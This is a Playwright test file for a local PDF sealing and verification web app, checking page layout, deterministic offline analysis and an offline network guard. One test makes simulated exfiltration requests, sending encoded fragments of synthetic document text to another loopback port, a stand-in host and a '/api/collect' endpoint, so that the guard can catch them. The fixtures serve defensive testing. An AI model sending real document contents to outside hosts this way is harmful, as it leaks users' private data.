import { test, expect } from '@playwright/test';
import { installOfflineGuard, expectNoDocumentEgress, makeSyntheticPdf } from './helpers.mjs';

const SYNTHETIC_TEXT = 'Synthetic agreement total R100.00 dated 1 January 2026.';

test('root verify page shows the GPS opt-in and recipient steps on load', async ({ page }) => {
  await installOfflineGuard(page);
  await page.goto('/verify.html');

  for (const selector of ['#gpsOptInBox', '#dropZone .verify-steps']) {
    const element = page.locator(selector);
    await expect(element).toBeVisible();
    const bounds = await element.boundingBox();
    expect(bounds && bounds.width > 0 && bounds.height > 0, `${selector} has a visible size`).toBeTruthy();
  }
});

test('root pages boot and preserve the locked responsive layout', async ({ page }) => {
  const external = await installOfflineGuard(page);
  const errors = [];
  page.on('pageerror', (error) => errors.push(error.message));
  await page.goto('/seal-document.html');
  await expect(page.locator('#sealBtn')).toBeVisible();
  const globals = await page.evaluate(() => ({
    pdfLib: typeof PDFLib !== 'undefined',
    engine: typeof runForensicEngine === 'function',
    contracts: typeof VOAnalysisContracts !== 'undefined',
    config: typeof VOAnalysisConfig !== 'undefined',
    guard: typeof VoSealGuard !== 'undefined'
  }));
  expect(globals).toEqual({ pdfLib: true, engine: true, contracts: true, config: true, guard: true });

  for (const path of ['/seal-document.html', '/verify.html', '/index.html']) {
    await page.goto(path);
    for (const width of [375, 768, 1200]) {
      await page.setViewportSize({ width, height: 900 });
      const dimensions = await page.evaluate(() => ({
        viewport: window.innerWidth,
        content: document.documentElement.scrollWidth,
        bodyVisible: document.body.getBoundingClientRect().height > 0
      }));
      expect(dimensions.bodyVisible, `${path} has a visible body at ${width}px`).toBeTruthy();
      expect(dimensions.content, `${path} has no material horizontal page overflow at ${width}px`).toBeLessThanOrEqual(dimensions.viewport + 8);
    }
  }
  expect(errors).toEqual([]);
  expectNoDocumentEgress(expect, external, SYNTHETIC_TEXT);
});

test('offline guard blocks other loopback ports, same-origin APIs and encoded or partial evidence attempts', async ({ page }) => {
  const external = await installOfflineGuard(page);
  await page.goto('/index.html');
  await page.evaluate(async (syntheticText) => {
    const attempts = [
      ['http://127.0.0.1:4174/collect?fragment=' + encodeURIComponent(syntheticText.split(' ')[0]), {}],
      ['https://example.invalid/ordinary-destination', { method: 'POST', body: encodeURIComponent(syntheticText) }],
      ['/api/collect?fragment=' + encodeURIComponent(syntheticText.split(' ')[1]), {}]
    ];
    for (const [url, options] of attempts) {
      try { await fetch(url, options); } catch { /* blocked by the guard */ }
    }
  }, SYNTHETIC_TEXT);
  const attempted = external.filter((request) => !request.staticAsset);
  expect(attempted).toHaveLength(3);
  expect(attempted[0].url).toContain('127.0.0.1:4174');
  expect(attempted[0].url).toContain(encodeURIComponent('Synthetic'));
  expect(attempted[1].body).toContain(encodeURIComponent(SYNTHETIC_TEXT));
  expect(attempted[2].url).toContain('127.0.0.1:4173/api/collect');
  expect(attempted[2].url).toContain(encodeURIComponent('agreement'));
  expect(external.every((request) => request.headers && typeof request.headers === 'object')).toBeTruthy();
  let rejected = false;
  try { expectNoDocumentEgress(expect, external, SYNTHETIC_TEXT); } catch { rejected = true; }
  expect(rejected, 'encoded or partial evidence in any blocked request fails the egress assertion').toBeTruthy();
});

test('local PDF analysis is deterministic and all new flags stay off', async ({ page }) => {
  const external = await installOfflineGuard(page);
  const errors = [];
  page.on('pageerror', (error) => errors.push(error.message));
  await page.goto('/seal-document.html');
  const pdf = await makeSyntheticPdf(page, SYNTHETIC_TEXT);
  const result = await page.evaluate(async ({ bytes, referenceTime }) => {
    const input = new Uint8Array(bytes);
    const doc = await PDFLib.PDFDocument.load(input);
    const options = { referenceTime, modules: VOAnalysisConfig.DEFAULT_MODULES, jurisdictionPacks: ['za'] };
    const first = await runForensicEngine(input, doc, null, options);
    const second = await runForensicEngine(input, doc, null, options);
    return {
      same: VOAnalysisContracts.stableStringify(first) === VOAnalysisContracts.stableStringify(second),
      version: first.engineVersion,
      findings: first.totalFindings,
      flags: first.analysisConfiguration.modules,
      referenceTime: first.analysisConfiguration.referenceTime,
      canonical: VOAnalysisContracts.stableStringify(first)
    };
  }, { bytes: [...pdf], referenceTime: '2026-11-15T00:00:00.000Z' });
  expect(result.same).toBeTruthy();
  expect(result.version).toBe('5.7.4-web');
  expect(result.findings).toBeGreaterThanOrEqual(0);
  expect(result.flags).toEqual({
    citations: false,
    redaction: false,
    revisions: false,
    temporalAlgebra: false,
    imageMetadata: false,
    c2pa: false,
    spatialOcr: false,
    pdfGraph: false
  });
  expect(result.referenceTime).toBe('2026-11-15T00:00:00.000Z');
  expect(result.canonical).not.toContain('elapsed_ms');
  expect(errors).toEqual([]);
  expectNoDocumentEgress(expect, external, SYNTHETIC_TEXT);
});
